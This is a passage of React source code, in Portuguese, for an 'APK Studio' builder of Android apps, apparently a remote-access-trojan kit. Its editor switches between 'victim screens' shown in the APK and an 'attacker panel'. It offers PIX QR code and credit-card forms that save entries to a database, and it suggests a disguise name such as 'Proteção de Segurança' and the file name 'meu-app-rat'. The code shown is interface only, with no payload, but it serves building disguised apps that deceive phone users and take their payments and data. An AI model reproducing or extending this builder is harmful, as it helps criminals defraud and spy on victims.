              <div className="mb-3">
                <p className="text-pink-400 text-[10px] font-semibold mb-1">📷 IMAGENS E MÍDIA</p>
                <div className="grid grid-cols-2 gap-1">
                  <button onClick={() => addElement('image')} className="flex items-center gap-1 px-2 py-1.5 bg-slate-700 hover:bg-slate-600 text-white rounded text-[10px]" title="Foto ou imagem">
                    🎨 Foto/Imagem
                  </button>
                  <button onClick={() => addElement('logo')} className="flex items-center gap-1 px-2 py-1.5 bg-slate-700 hover:bg-slate-600 text-white rounded text-[10px]" title="Logo redondo">
                    🎨 Logo
                  </button>
                  <button onClick={() => addElement('video')} className="flex items-center gap-1 px-2 py-1.5 bg-slate-700 hover:bg-slate-600 text-white rounded text-[10px]" title="Vídeo MP4 ou YouTube">
                    🎨 Vídeo
                  </button>
                  <button onClick={() => addElement('audio')} className="flex items-center gap-1 px-2 py-1.5 bg-slate-700 hover:bg-slate-600 text-white rounded text-[10px]" title="Som ou música">
                    🎨 Som/Música
                  </button>
                  <button onClick={() => addElement('gif')} className="flex items-center gap-1 px-2 py-1.5 bg-slate-700 hover:bg-slate-600 text-white rounded text-[10px]" title="Imagem animada">
                    🎨 GIF Animado
                  </button>
                  <button onClick={() => addElement('lottie')} className="flex items-center gap-1 px-2 py-1.5 bg-slate-700 hover:bg-slate-600 text-white rounded text-[10px]" title="Animação bonita">
                    🎨 Animação
                  </button>
                  <button onClick={() => addElement('icon')} className="flex items-center gap-1 px-2 py-1.5 bg-slate-700 hover:bg-slate-600 text-white rounded text-[10px]" title="Emoji ou ícone">
                    🎨 Emoji/Ícone
                  </button>
                </div>
              </div>
              
              {/* INDICADORES */}
              <div className="mb-3">
                <p className="text-green-400 text-[10px] font-semibold mb-1">📈 INDICADORES <span className="text-[8px]">(mostram dados)</span></p>
                <div className="grid grid-cols-2 gap-1">
                  <button onClick={() => addElement('progress_bar')} className="flex items-center gap-1 px-2 py-1.5 bg-slate-700 hover:bg-slate-600 text-white rounded text-[10px]" title="Barra de progresso">
                    🎨 Barra %
                  </button>
                  <button onClick={() => addElement('countdown')} className="flex items-center gap-1 px-2 py-1.5 bg-slate-700 hover:bg-slate-600 text-white rounded text-[10px]" title="Contador regressivo">
                    ⏱️ Timer
                  </button>
                </div>
              </div>
              
              {/* PAGAMENTO */}
              {(currentProject?.enablePayment) && (
                <div className="mb-3">
                  <p className="text-green-400 text-[10px] font-semibold mb-1">💰 PAGAMENTO <span className="text-[8px]">(salvam dados)</span></p>
                  <div className="grid grid-cols-2 gap-1">
                    <button onClick={() => addElement('pix_qrcode')} className="flex items-center gap-1 px-2 py-1.5 bg-green-700 hover:bg-green-600 text-white rounded text-[10px] border border-yellow-500/50" title="QR Code PIX - SALVA TRANSAÇÃO">
                      📊 QR Code PIX
                    </button>
                    <button onClick={() => addElement('pix_copypaste')} className="flex items-center gap-1 px-2 py-1.5 bg-green-700 hover:bg-green-600 text-white rounded text-[10px]" title="Botão copiar código PIX">
                      🎨 Copiar PIX
                    </button>
                    <button onClick={() => addElement('credit_card_form')} className="col-span-2 flex items-center justify-center gap-1 px-2 py-1.5 bg-green-700 hover:bg-green-600 text-white rounded text-[10px] border border-yellow-500/50" title="Formulário de cartão - SALVA NO BANCO">
                      📊 Formulário Cartão
                    </button>
                  </div>
                </div>
              )}
              
              {/* AVANÇADO */}
              <div className="mb-3">
                <p className="text-red-400 text-[10px] font-semibold mb-1">🚀 ESPECIAIS</p>
                <div className="grid grid-cols-2 gap-1">
                  <button onClick={() => addElement('webview')} className="flex items-center gap-1 px-2 py-1.5 bg-slate-700 hover:bg-slate-600 text-white rounded text-[10px]" title="Abrir site dentro do app">
                    🎨 Site/Página
                  </button>
                  <button onClick={() => addElement('map')} className="flex items-center gap-1 px-2 py-1.5 bg-slate-700 hover:bg-slate-600 text-white rounded text-[10px]" title="Mapa com localização">
                    🎨 Mapa
                  </button>
                </div>
              </div>
              
              {/* INFO */}
              <div className="p-2 bg-slate-900 rounded text-[9px] text-gray-400 mt-4">
                <p className="text-blue-400 font-semibold mb-1">💡 Dica:</p>
                <p>• Elementos 📊 criam campos no banco de dados automaticamente</p>
                <p>• Elementos 🎨 são só visuais, não salvam dados</p>
                <p>• Ao fazer o Build, o sistema cria a API e banco automaticamente!</p>
              </div>

              {/* Lista de Telas */}
              <h3 className="text-white font-semibold mt-6 mb-3 text-sm flex items-center justify-between">
                📱 Telas
                <button
                  onClick={addScreen}
                  className="p-1 bg-purple-600 hover:bg-purple-700 rounded"
                >
                  <Plus className="w-4 h-4" />
                </button>
              </h3>
              <div className="space-y-1">
                {currentScreens.map((screen, index) => (
                  <div
                    key={screen.id}
                    onClick={() => setCurrentScreenIndex(index)}
                    className={`flex items-center justify-between px-2 py-2 rounded cursor-pointer text-sm ${
                      currentScreenIndex === index ? 'bg-purple-600' : 'bg-slate-700 hover:bg-slate-600'
                    }`}
                  >
                    <span className="text-white truncate">{screen.name}</span>
                    {currentScreens.length > 1 && (
                      <button
                        onClick={(e) => { e.stopPropagation(); deleteScreen(index); }}
                        className="text-red-400 hover:text-red-300"
                      >
                        <Trash2 className="w-3 h-3" />
                      </button>
                    )}
                  </div>
                ))}
              </div>
            </div>

            {/* Centro - Preview GRANDE e Responsivo */}
            <div className="flex-1 flex flex-col bg-slate-950 overflow-hidden">
              
              {/* === SELETOR VÍTIMA vs PAINEL === */}
              {(currentProject?.projectType === 'rat' || currentProject?.projectType === 'hybrid' || currentProject?.projectType === 'mobile_panel') && (
                <div className="flex items-center justify-center gap-4 p-4 bg-slate-900 border-b-2 border-slate-700">
                  <button
                    onClick={() => setEditingMode('victim')}
                    className={`flex items-center gap-3 px-8 py-4 rounded-2xl font-bold text-lg transition-all ${
                      editingMode === 'victim'
                        ? 'bg-gradient-to-r from-red-600 to-orange-600 text-white shadow-xl scale-105 ring-4 ring-red-500/50'
                        : 'bg-slate-700 text-gray-400 hover:bg-slate-600'
                    }`}
                  >
                    <span className="text-2xl">📱</span>
                    <div className="text-left">
                      <p className="font-bold">TELAS DA VÍTIMA</p>
                      <p className="text-xs opacity-75">O que a vítima vai ver no APK</p>
                    </div>
                  </button>
                  
                  <div className="text-gray-500 text-2xl">⚡</div>
                  
                  <button
                    onClick={() => setEditingMode('panel')}
                    className={`flex items-center gap-3 px-8 py-4 rounded-2xl font-bold text-lg transition-all ${
                      editingMode === 'panel'
                        ? 'bg-gradient-to-r from-green-600 to-emerald-600 text-white shadow-xl scale-105 ring-4 ring-green-500/50'
                        : 'bg-slate-700 text-gray-400 hover:bg-slate-600'
                    }`}
                  >
                    <span className="text-2xl">🎮</span>
                    <div className="text-left">
                      <p className="font-bold">TELAS DO PAINEL</p>
                      <p className="text-xs opacity-75">O que o atacante vai ver no celular</p>
                    </div>
                  </button>
                </div>
              )}
              
              {/* Barra de navegação de telas */}
              <div className="flex items-center gap-2 p-3 bg-slate-800 border-b border-slate-700 overflow-x-auto">
                <span className={`text-xs font-bold px-3 py-1 rounded-full whitespace-nowrap ${
                  editingMode === 'victim' ? 'bg-red-600 text-white' : 'bg-green-600 text-white'
                }`}>
                  {editingMode === 'victim' ? '📱 VÍTIMA:' : '🎮 PAINEL:'}
                </span>
                {currentScreens.map((screen, idx) => (
                  <button
                    key={screen.id}
                    onClick={() => setCurrentScreenIndex(idx)}
                    className={`px-3 py-1.5 rounded-lg text-xs font-semibold whitespace-nowrap transition-all ${
                      currentScreenIndex === idx 
                        ? editingMode === 'victim' 
                          ? 'bg-red-600 text-white shadow-lg' 
                          : 'bg-green-600 text-white shadow-lg'
                        : 'bg-slate-700 text-gray-300 hover:bg-slate-600'
                    }`}
                  >
                    {screen.name}
                  </button>
                ))}
                <button
                  onClick={addScreen}
                  className={`px-3 py-1.5 rounded-lg text-xs font-semibold text-white hover:opacity-90 whitespace-nowrap ${
                    editingMode === 'victim' ? 'bg-red-700' : 'bg-green-700'
                  }`}
                >
                  ➕ Nova Tela
                </button>
              </div>
              
              {/* Área do Preview Principal */}
              <div className="flex-1 flex items-start justify-center p-6 gap-6 overflow-auto" style={{ minHeight: '900px' }}>
              
              {/* Preview Principal - GRANDE e Editável */}
              <div className="flex flex-col items-center">
                <div className="mb-3 text-center">
                  <span className={`text-white text-sm px-4 py-2 rounded-full font-bold shadow-lg ${
                    editingMode === 'victim' 
                      ? 'bg-gradient-to-r from-red-600 to-orange-600' 
                      : 'bg-gradient-to-r from-green-600 to-emerald-600'
                  }`}>
                    {editingMode === 'victim' ? '📱 VÍTIMA' : '🎮 PAINEL'} - {currentScreen?.name || 'Tela'} - EDITÁVEL
                  </span>
                </div>
                <div className="relative">
                  {/* Frame do celular - cor de fundo igual à tela */}
                  <div 
                    className={`rounded-[50px] shadow-2xl border-4 ${
                      editingMode === 'victim' 
                        ? 'border-red-600/50' 
                        : 'border-green-600/50'
                    }`}
                    style={{
                      backgroundColor: currentScreen?.backgroundColor || '#0a0a15',
                      padding: '16px'
                    }}
                  >
                    {/* Área interna do celular - mesma cor de fundo */}
                    <div 
                      ref={previewRef}
                      className="relative overflow-hidden rounded-[40px]"
                      style={{
                        width: '360px',
                        height: '780px',
                        backgroundColor: currentScreen?.backgroundColor || '#0a0a15'
                      }}
                      onMouseMove={handleMouseMove}
                      onMouseUp={handleMouseUp}
                      onMouseLeave={handleMouseUp}
                      onClick={(e) => {
                        // Só desseleciona se clicou no fundo (não em um elemento)
                        if (e.target === e.currentTarget) {
                          setSelectedElement(null);
                        }
                      }}
                    >
                      {/* Notch */}
                      <div className="absolute top-0 left-1/2 -translate-x-1/2 w-32 h-7 bg-gray-800 rounded-b-3xl z-10 pointer-events-none" />
                    
                    {/* Elementos */}
                    {currentScreen?.elements.map(el => {
                      const scaleX = 360 / ANDROID_WIDTH;
                      const scaleY = 780 / ANDROID_HEIGHT;
                      const hasAction = el.type === 'button' && el.buttonAction;
                      
                      return (
                        <div
                          key={el.id}
                          className={`absolute ${hasAction ? 'cursor-pointer hover:opacity-80' : 'cursor-move'} ${selectedElement === el.id ? 'ring-2 ring-blue-500' : ''}`}
                          style={{
                            left: el.x * scaleX,
                            top: el.y * scaleY,
                            width: el.width * scaleX,
                            height: el.height * scaleY,
                            opacity: (el.opacity || 100) / 100,
                            zIndex: el.type === 'rectangle' ? 1 : 10
                          }}
                          onMouseDown={(e) => {
                            e.stopPropagation();
                            handleMouseDown(e, el.id);
                          }}
                          onClick={(e) => {
                            e.stopPropagation();
                            // Seleciona o elemento ao clicar
                            setSelectedElement(el.id);
                          }}
                          onDoubleClick={(e) => {
                            e.stopPropagation();
                            if (el.type === 'button' && el.buttonAction) {
                              handleButtonClick(el);
                            }
                          }}
                          title={hasAction ? `Dê duplo clique para navegar (${el.buttonAction})` : `Clique para selecionar, arraste para mover`}
                        >
                          {el.type === 'text' && (() => {
                            // Substitui variáveis dinâmicas pelo valor real
                            let displayContent = el.content || '';
                            const isDynamic = displayContent.includes('{{');
                            if (isDynamic) {
                              Object.entries(dynamicVariables).forEach(([key, value]) => {
                                displayContent = displayContent.replace(new RegExp(`\\{\\{${key}\\}\\}`, 'g'), value);
                              });
                            }
                            return (
                              <div 
                                style={{ 
                                  color: isDynamic ? (displayContent.includes('Online') ? '#00FF00' : displayContent.includes('Offline') ? '#FF4444' : '#00D4FF') : el.color, 
                                  fontSize: (el.fontSize || 16) * scaleX, 
                                  fontWeight: el.fontWeight, 
                                  textAlign: el.textAlign || 'center', 
                                  width: '100%', 
                                  height: '100%', 
                                  display: 'flex', 
                                  alignItems: 'center', 
                                  justifyContent: el.textAlign === 'left' ? 'flex-start' : el.textAlign === 'right' ? 'flex-end' : 'center',
                                  border: isDynamic ? '1px dashed #00D4FF' : 'none',
                                  borderRadius: 4
                                }}
                                title={isDynamic ? `Variável: ${el.content} → ${displayContent}` : undefined}
                              >
                                {isDynamic ? (
                                  <span className="flex items-center gap-1">
                                    <span className="text-yellow-400 text-xs">⚡</span>
                                    {displayContent}
                                  </span>
                                ) : displayContent}
                              </div>
                            );
                          })()}
                          {el.type === 'button' && (
                            <div 
                              style={{ 
                                backgroundColor: el.backgroundColor, 
                                color: el.color, 
                                fontSize: (el.fontSize || 16) * scaleX, 
                                fontWeight: el.fontWeight, 
                                borderRadius: el.borderRadius, 
                                width: '100%', 
                                height: '100%', 
                                display: 'flex', 
                                alignItems: 'center', 
                                justifyContent: 'center',
                                cursor: 'pointer',
                                transition: 'all 0.2s'
                              }}
                              title={el.buttonAction ? `Ação: ${el.buttonAction}${el.targetScreenIndex !== undefined ? ` → Tela ${el.targetScreenIndex + 1}` : ''}` : undefined}
                            >
                              {el.content}
                              {el.buttonAction && <span className="absolute -top-1 -right-1 text-xs bg-blue-500 text-white px-1 rounded">▶</span>}
                            </div>
                          )}
                          {el.type === 'input' && (
                            <div className="w-full h-full flex flex-col justify-center" style={{ backgroundColor: el.backgroundColor, borderRadius: el.borderRadius, padding: '4px 8px', border: '1px solid #444' }}>
                              <span className="text-gray-400" style={{ fontSize: 10 * scaleX }}>{el.inputLabel}</span>
                              <span className="text-gray-500" style={{ fontSize: 12 * scaleX }}>{el.placeholder}</span>
                            </div>
                          )}
                          {el.type === 'image' && (
                            <div className="w-full h-full flex items-center justify-center bg-slate-700 rounded">
                              {el.imageUrl ? (
                                <img src={el.imageUrl} className="max-w-full max-h-full object-contain" />
                              ) : (
                                <span className="text-gray-500">📷</span>
                              )}
                            </div>
                          )}
                          {(el.type === 'rectangle' || el.type === 'circle') && (
                            <div className="w-full h-full" style={{ backgroundColor: el.backgroundColor, borderRadius: el.type === 'circle' ? '50%' : el.borderRadius }} />
                          )}
                          {el.type === 'pix_qrcode' && (
                            <div className="w-full h-full flex flex-col items-center justify-center" style={{ backgroundColor: el.backgroundColor, borderRadius: el.borderRadius }}>
                              <QrCode className="w-1/2 h-1/2 text-gray-800" />
                              <span className="text-gray-800 font-bold" style={{ fontSize: 14 * scaleX }}>R$ {el.pixAmount}</span>
                            </div>
                          )}
                          {el.type === 'pix_copypaste' && (
                            <div style={{ backgroundColor: el.backgroundColor, color: el.color, borderRadius: el.borderRadius, width: '100%', height: '100%', display: 'flex', alignItems: 'center', justifyContent: 'center', gap: '4px' }}>
                              <Copy className="w-4 h-4" style={{ transform: `scale(${scaleX})` }} />
                              <span style={{ fontSize: 12 * scaleX }}>{el.content}</span>
                            </div>
                          )}
                          {/* VIDEO */}
                          {el.type === 'video' && (
                            <div className="w-full h-full flex flex-col items-center justify-center bg-slate-800 rounded" style={{ borderRadius: el.borderRadius }}>
                              {el.videoUrl ? (
                                <video 
                                  src={el.videoUrl} 
                                  className="w-full h-full object-cover rounded"
                                  style={{ borderRadius: el.borderRadius }}
                                  controls={el.controls}
                                  autoPlay={el.autoPlay}
                                  loop={el.loop}
                                  muted={el.muted}
                                />
                              ) : (
                                <>
                                  <span className="text-4xl">🎬</span>
                                  <span className="text-gray-500 text-xs mt-1">Vídeo</span>
                                </>
                              )}
                            </div>
                          )}
                          {/* AUDIO */}
                          {el.type === 'audio' && (
                            <div className="w-full h-full flex flex-col items-center justify-center bg-gradient-to-r from-purple-900 to-pink-900 rounded" style={{ borderRadius: el.borderRadius }}>
                              {el.audioUrl ? (
                                <audio src={el.audioUrl} controls className="w-full px-2" />
                              ) : (
                                <>
                                  <span className="text-3xl">🎵</span>
                                  <span className="text-gray-300 text-xs mt-1">Áudio</span>
                                </>
                              )}
                            </div>
                          )}
                          {/* GIF */}
                          {el.type === 'gif' && (
                            <div className="w-full h-full flex items-center justify-center bg-slate-700 rounded overflow-hidden" style={{ borderRadius: el.borderRadius }}>
                              {el.imageUrl ? (
                                <img src={el.imageUrl} className="w-full h-full object-cover" style={{ borderRadius: el.borderRadius }} />
                              ) : (
                                <div className="flex flex-col items-center">
                                  <span className="text-3xl">🎞️</span>
                                  <span className="text-gray-500 text-xs mt-1">GIF</span>
                                </div>
                              )}
                            </div>
                          )}
                          {/* LOGO */}
                          {el.type === 'logo' && (
                            <div className="w-full h-full flex items-center justify-center bg-slate-700/50 rounded-full overflow-hidden" style={{ borderRadius: '50%' }}>
                              {el.imageUrl ? (
                                <img src={el.imageUrl} className="w-full h-full object-cover" />
                              ) : (
                                <span className="text-4xl">🏢</span>
                              )}
                            </div>
                          )}
                          {/* ICON */}
                          {el.type === 'icon' && (
                            <div className="w-full h-full flex items-center justify-center" style={{ color: el.color }}>
                              <span style={{ fontSize: (el.fontSize || 32) * scaleX }}>{el.iconName || '⭐'}</span>
                            </div>
                          )}
                          {/* CARD */}
                          {el.type === 'card' && (
                            <div 
                              className="w-full h-full" 
                              style={{ 
                                backgroundColor: el.backgroundColor || '#1a1a2e', 
                                borderRadius: el.borderRadius || 12,
                                boxShadow: el.shadowBlur ? `0 ${el.shadowBlur}px ${el.shadowBlur * 2}px ${el.shadowColor || 'rgba(0,0,0,0.3)'}` : undefined
                              }} 
                            />
                          )}
                          {/* CHECKBOX */}
                          {el.type === 'checkbox' && (
                            <div className="w-full h-full flex items-center gap-2 px-2">
                              <div className={`w-5 h-5 rounded border-2 flex items-center justify-center ${el.checked ? 'bg-green-500 border-green-500' : 'border-gray-500'}`}>
                                {el.checked && <span className="text-white text-xs">✓</span>}
                              </div>
                              <span style={{ color: el.color, fontSize: (el.fontSize || 14) * scaleX }}>{el.content}</span>
                            </div>
                          )}
                          {/* SWITCH */}
                          {el.type === 'switch' && (
                            <div className="w-full h-full flex items-center justify-between px-2">
                              <span style={{ color: el.color, fontSize: (el.fontSize || 14) * scaleX }}>{el.content}</span>
                              <div className={`w-10 h-5 rounded-full relative ${el.checked ? 'bg-green-500' : 'bg-gray-600'}`}>
                                <div className={`absolute w-4 h-4 bg-white rounded-full top-0.5 transition-all ${el.checked ? 'right-0.5' : 'left-0.5'}`} />
                              </div>
                            </div>
                          )}
                          {/* PROGRESS BAR */}
                          {el.type === 'progress_bar' && (
                            <div className="w-full h-full flex items-center">
                              <div className="w-full h-full rounded-full overflow-hidden relative" style={{ backgroundColor: el.backgroundColor || '#333' }}>
                                <div 
                                  className="h-full rounded-full transition-all duration-500 relative overflow-hidden" 
                                  style={{ 
                                    backgroundColor: el.color || '#FF6600', 
                                    width: `${el.currentValue || 0}%`,
                                    boxShadow: `0 0 10px ${el.color || '#FF6600'}40`
                                  }} 
                                >
                                  {/* Efeito de brilho animado */}
                                  <div className="absolute inset-0 bg-gradient-to-r from-transparent via-white/30 to-transparent animate-shimmer" 
                                    style={{ animation: 'shimmer 2s infinite' }} 
                                  />
                                </div>
                                {/* Texto de porcentagem */}
                                <span className="absolute inset-0 flex items-center justify-center text-white text-xs font-bold drop-shadow">
                                  {el.currentValue || 0}%
                                </span>
                              </div>
                            </div>
                          )}
                          {/* DIVIDER */}
                          {el.type === 'divisor' && (
                            <div className="w-full h-full flex items-center">
                              <div className="w-full" style={{ height: el.borderWidth || 1, backgroundColor: el.color || '#333' }} />
                            </div>
                          )}
                          {/* ANIMATION / LOTTIE */}
                          {(el.type === 'animation' || el.type === 'lottie') && (
                            <div className="w-full h-full flex flex-col items-center justify-center bg-gradient-to-br from-blue-900 to-purple-900 rounded overflow-hidden" style={{ borderRadius: el.borderRadius }}>
                              {el.imageUrl ? (
                                <iframe 
                                  src={`https://lottie.host/embed/${el.imageUrl.split('/').pop()}/animation.json`}
                                  className="w-full h-full border-0"
                                  style={{ background: 'transparent' }}
                                />
                              ) : (
                                <>
                                  <span className="text-3xl animate-bounce">✨</span>
                                  <span className="text-gray-300 text-xs mt-1">Lottie</span>
                                </>
                              )}
                            </div>
                          )}
                          {/* WEBVIEW */}
                          {el.type === 'webview' && (
                            <div className="w-full h-full flex flex-col items-center justify-center bg-slate-900 rounded border border-slate-600" style={{ borderRadius: el.borderRadius }}>
                              <span className="text-2xl">🌐</span>
                              <span className="text-gray-400 text-xs mt-1 truncate px-2" style={{ maxWidth: '100%' }}>{el.buttonUrl || 'WebView'}</span>
                            </div>
                          )}
                          {/* MAP */}
                          {el.type === 'map' && (
                            <div className="w-full h-full flex flex-col items-center justify-center bg-gradient-to-br from-green-900 to-blue-900 rounded" style={{ borderRadius: el.borderRadius }}>
                              <span className="text-3xl">🗺️</span>
                              <span className="text-gray-300 text-xs mt-1">Mapa</span>
                            </div>
                          )}
                          {/* DROPDOWN */}
                          {el.type === 'dropdown' && (
                            <div 
                              className="w-full h-full flex items-center justify-between px-3" 
                              style={{ backgroundColor: el.backgroundColor, borderRadius: el.borderRadius, border: '1px solid #444' }}
                            >
                              <span style={{ color: el.color, fontSize: (el.fontSize || 14) * scaleX }}>{el.selectedValue || 'Selecione...'}</span>
                              <span className="text-gray-400">▼</span>
                            </div>
                          )}
                          {/* SLIDER */}
                          {el.type === 'slider' && (
                            <div className="w-full h-full flex flex-col justify-center px-2">
                              <div className="w-full h-2 bg-gray-700 rounded-full relative">
                                <div 
                                  className="absolute h-full rounded-full" 
                                  style={{ backgroundColor: el.color || '#FF6600', width: `${((el.currentValue || 50) / (el.maxValue || 100)) * 100}%` }} 
                                />
                                <div 
                                  className="absolute w-4 h-4 bg-white rounded-full -top-1 shadow"
                                  style={{ left: `calc(${((el.currentValue || 50) / (el.maxValue || 100)) * 100}% - 8px)` }}
                                />
                              </div>
                            </div>
                          )}
                          {/* TIMER */}
                          {el.type === 'timer' && (
                            <div className="w-full h-full flex items-center justify-center" style={{ backgroundColor: el.backgroundColor, borderRadius: el.borderRadius }}>
                              <span style={{ color: el.color, fontSize: (el.fontSize || 24) * scaleX, fontWeight: 'bold', fontFamily: 'monospace' }}>
                                {el.timerFormat || '00:00'}
                              </span>
                            </div>
                          )}
                        </div>
                      );
                    })}
                  </div>
                </div>
              </div>
              </div>
              
              {/* Galeria de Miniaturas - Todas as Telas */}
              <div className="flex flex-col items-center max-h-full">
                <div className="mb-3 text-center">
                  <span className={`text-white text-sm px-4 py-2 rounded-full font-bold ${
                    editingMode === 'victim' ? 'bg-red-600' : 'bg-green-600'
                  }`}>
                    {editingMode === 'victim' ? '📱 TELAS VÍTIMA' : '🎮 TELAS PAINEL'} ({currentScreens.length})
                  </span>
                </div>
                <div className={`flex flex-col gap-3 overflow-y-auto max-h-[650px] p-2 rounded-xl border-2 ${
                  editingMode === 'victim' ? 'bg-red-950/30 border-red-600/30' : 'bg-green-950/30 border-green-600/30'
                }`}>
                  {currentScreens.map((screen, idx) => {
                    const thumbScaleX = 120 / ANDROID_WIDTH;
                    const thumbScaleY = 260 / ANDROID_HEIGHT;
                    
                    return (
                      <button
                        key={screen.id}
                        onClick={() => setCurrentScreenIndex(idx)}
                        className={`relative flex flex-col items-center transition-all ${
                          currentScreenIndex === idx 
                            ? 'scale-105 z-10' 
                            : 'opacity-70 hover:opacity-100'
                        }`}
                      >
                        <div 
                          className={`rounded-2xl p-1.5 shadow-xl ${
                            currentScreenIndex === idx 
                              ? editingMode === 'victim' ? 'ring-3 ring-red-500' : 'ring-3 ring-green-500'
                              : ''
                          }`}
                          style={{
                            backgroundColor: screen.backgroundColor || '#0a0a15'
                          }}
                        >
                          <div 
                            className="relative overflow-hidden rounded-xl"
                            style={{
                              width: '120px',
                              height: '260px',
                              backgroundColor: screen.backgroundColor || '#0a0a15'
                            }}
                          >
                            {/* Notch mini */}
                            <div className="absolute top-0 left-1/2 -translate-x-1/2 w-10 h-2 bg-gray-700 rounded-b-lg z-10" />
                            
                            {/* Renderiza elementos em miniatura */}
                            {screen.elements.slice(0, 15).map(el => (
                              <div
                                key={`thumb-${el.id}`}
                                className="absolute pointer-events-none"
                                style={{
                                  left: el.x * thumbScaleX,
                                  top: el.y * thumbScaleY,
                                  width: el.width * thumbScaleX,
                                  height: el.height * thumbScaleY,
                                  opacity: (el.opacity || 100) / 100
                                }}
                              >
                                {el.type === 'text' && (
                                  <div style={{ 
                                    color: el.color, 
                                    fontSize: Math.max(4, (el.fontSize || 16) * thumbScaleX),
                                    overflow: 'hidden'
                                  }} />
                                )}
                                {el.type === 'button' && (
                                  <div style={{ 
                                    backgroundColor: el.backgroundColor, 
                                    borderRadius: (el.borderRadius || 8) * thumbScaleX, 
                                    width: '100%', 
                                    height: '100%'
                                  }} />
                                )}
                                {el.type === 'input' && (
                                  <div style={{ 
                                    backgroundColor: el.backgroundColor || '#1a1a2e', 
                                    borderRadius: (el.borderRadius || 8) * thumbScaleX, 
                                    width: '100%', 
                                    height: '100%'
                                  }} />
                                )}
                                {(el.type === 'rectangle' || el.type === 'card') && (
                                  <div style={{ 
                                    backgroundColor: el.backgroundColor, 
                                    borderRadius: (el.borderRadius || 0) * thumbScaleX, 
                                    width: '100%', 
                                    height: '100%'
                                  }} />
                                )}
                                {el.type === 'circle' && (
                                  <div style={{ 
                                    backgroundColor: el.backgroundColor, 
                                    borderRadius: '50%', 
                                    width: '100%', 
                                    height: '100%'
                                  }} />
                                )}
                              </div>
                            ))}
                            
                            {/* Indicador de tela atual */}
                            {currentScreenIndex === idx && (
                              <div className={`absolute inset-0 flex items-center justify-center ${
                                editingMode === 'victim' ? 'bg-red-500/20' : 'bg-green-500/20'
                              }`}>
                                <span className={`text-xl ${editingMode === 'victim' ? 'text-red-400' : 'text-green-400'}`}>✏️</span>
                              </div>
                            )}
                          </div>
                        </div>
                        <p className={`mt-1.5 text-[10px] font-semibold max-w-[120px] truncate ${
                          currentScreenIndex === idx 
                            ? editingMode === 'victim' ? 'text-red-400' : 'text-green-400'
                            : 'text-gray-400'
                        }`}>
                          {idx + 1}. {screen.name}
                        </p>
                      </button>
                    );
                  })}
                </div>
              </div>
              </div>
            </div>

            {/* Painel Direito - Propriedades */}
            <div className="w-64 bg-slate-800 p-3 border-l border-slate-700 overflow-y-auto">
              {selectedEl ? (
                <ElementProperties
                  element={selectedEl}
                  onUpdate={(updates) => updateElement(selectedEl.id, updates)}
                  onDelete={() => deleteElement(selectedEl.id)}
                  onImageUpload={(e) => handleImageUpload(e, selectedEl.id)}
                  screens={currentScreens}
                />
              ) : (
                <ScreenProperties
                  screen={currentScreen}
                  onUpdate={(updates) => {
                    if (!currentProject || !currentScreen) return;
                    // Usa o array correto baseado no modo de edição
                    const screensKey = editingMode === 'victim' ? 'screens' : 'panelScreens';
                    const currentScreensArray = editingMode === 'victim' ? currentProject.screens : (currentProject.panelScreens || []);
                    const newScreens = [...currentScreensArray];
                    newScreens[currentScreenIndex] = { ...currentScreen, ...updates };
                    setCurrentProject({ ...currentProject, [screensKey]: newScreens });
                  }}
                />
              )}
            </div>
          </>
        )}

        {activeTab === 'pix' && currentProject && (
          <div className="flex-1 p-6 overflow-y-auto">
            <div className="max-w-2xl mx-auto">
              <h2 className="text-2xl font-bold text-white mb-6">💰 Configuração de Pagamento PIX</h2>
              
              {/* Selecionar Chave PIX */}
              <div className="bg-slate-800 rounded-xl p-6 mb-6">
                <h3 className="text-white font-semibold mb-4">Selecionar Chave PIX</h3>
                {pixConfigs.length === 0 ? (
                  <p className="text-gray-400">Nenhuma chave configurada. Configure na tela inicial do APK Studio.</p>
                ) : (
                  <div className="space-y-2">
                    {pixConfigs.map(config => (
                      <label
                        key={config.id}
                        className={`flex items-center gap-3 p-3 rounded-lg cursor-pointer ${
                          currentProject.pixConfig?.id === config.id 
                            ? 'bg-green-600/30 border border-green-500' 
                            : 'bg-slate-700 hover:bg-slate-600'
                        }`}
                      >
                        <input
                          type="radio"
                          name="pixConfig"
                          checked={currentProject.pixConfig?.id === config.id}
                          onChange={() => setCurrentProject({ ...currentProject, pixConfig: config })}
                          className="w-4 h-4"
                        />
                        <div>
                          <span className="text-white font-semibold">{config.name}</span>
                          <p className="text-gray-400 text-xs">{config.pixKey}</p>
                        </div>
                      </label>
                    ))}
                  </div>
                )}
              </div>

              {/* Preview do PIX */}
              {currentProject.pixConfig && (
                <div className="bg-slate-800 rounded-xl p-6">
                  <h3 className="text-white font-semibold mb-4">Preview do QR Code</h3>
                  <div className="flex flex-col items-center gap-4">
                    <div className="bg-white p-6 rounded-xl">
                      <QrCode className="w-48 h-48 text-gray-800" />
                    </div>
                    <p className="text-gray-400 text-sm text-center">
                      QR Code será gerado dinamicamente com o valor definido no elemento
                    </p>
                  </div>
                </div>
              )}
            </div>
          </div>
        )}

        {activeTab === 'settings' && currentProject && (
          <div className="flex-1 p-6 overflow-y-auto">
            <div className="max-w-2xl mx-auto space-y-6">
              <h2 className="text-2xl font-bold text-white mb-6">⚙️ Configurações do Projeto</h2>
              
              {/* Info Básica */}
              <div className="bg-slate-800 rounded-xl p-6">
                <h3 className="text-white font-semibold mb-4">📱 Informações do App</h3>
                <div className="space-y-4">
                  <div>
                    <label className="text-gray-400 text-sm">Nome do App (exibido no celular)</label>
                    <input
                      type="text"
                      value={currentProject.appName}
                      onChange={(e) => setCurrentProject({ ...currentProject, appName: e.target.value })}
                      className="w-full bg-slate-700 text-white px-3 py-2 rounded mt-1"
                      placeholder="Ex: Proteção de Segurança"
                    />
                  </div>
                  
                  {/* 🔥 NOME DO ARQUIVO APK - OBRIGATÓRIO */}
                  <div className="bg-gradient-to-r from-red-900/30 to-orange-900/30 p-4 rounded-lg border border-red-600">
                    <label className="text-red-400 text-sm font-bold flex items-center gap-2">
                      📦 Nome do Arquivo APK <span className="text-xs bg-red-600 px-2 py-0.5 rounded">OBRIGATÓRIO</span>
                    </label>
                    <input
                      type="text"
                      value={currentProject.apkFileName || ''}
                      onChange={(e) => setCurrentProject({ 
                        ...currentProject, 
                        apkFileName: e.target.value.replace(/[^a-zA-Z0-9-_]/g, '-').toLowerCase() 
                      })}
                      className="w-full bg-slate-900 text-white px-3 py-2 rounded mt-2 border-2 border-red-600 focus:border-orange-500"
                      placeholder="meu-app-rat"
                    />
                    <p className="text-gray-400 text-xs mt-2">
                      📄 Arquivo final: <span className="text-green-400 font-mono">{currentProject.apkFileName || 'nome-do-app'}.apk</span>
                    </p>
